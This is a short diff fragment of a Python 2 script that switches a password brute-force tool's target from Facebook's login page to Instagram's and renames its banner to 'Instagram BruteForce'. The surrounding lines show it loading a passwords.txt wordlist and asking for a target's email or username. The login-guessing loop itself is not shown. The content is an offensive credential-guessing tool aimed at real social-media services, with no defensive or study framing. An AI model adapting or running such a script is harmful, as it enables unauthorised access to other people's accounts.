@@ -9,7 +9,7 @@ if sys.version_info[0] !=2:
 			''')
 	sys.exit()
 
-post_url='https://www.facebook.com/login.php'
+post_url='https://www.instagram.com/login.php'
 headers = {
 	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
 }
@@ -24,7 +24,7 @@ except:
 	print('\n\tPlease install mechanize.\n')
 	sys.exit()
 
-print('\n---------- Welcome To Facebook BruteForce ----------\n')
+print('\n---------- Welcome To Instagram BruteForce ----------\n')
 file=open('passwords.txt','r')
 
 email=str(raw_input('Enter Email/Username : ').strip())
